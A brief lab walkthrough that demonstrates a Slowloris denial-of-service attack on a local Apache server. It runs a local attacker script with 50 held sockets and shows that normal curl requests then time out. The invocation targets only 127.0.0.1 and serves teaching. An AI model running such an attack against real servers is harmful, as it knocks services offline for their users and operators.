# Live Slowloris Attack Walkthrough (N = 50)

## 1. Start the server

```bash
sudo systemctl start apache2
```

## 2. Open a client terminal

```bash
# nothing to run yet, just keep this terminal ready for curl
```

## 3. Send a request and confirm you get a response

```bash
curl -m 10 -i http://127.0.0.1/
```

## 4. Start the attacker (N = 50)

```bash
python3 core/attacker.py --target-ip 127.0.0.1 --target-port 80 --num-sockets 50 --interval 5 --duration 60
```

## 5. From the client terminal, send another request — it will not get a response

```bash
curl -m 10 -i http://127.0.0.1/
```

`curl` will hang and then time out (`curl: (28) Operation timed out`) instead of returning a response.
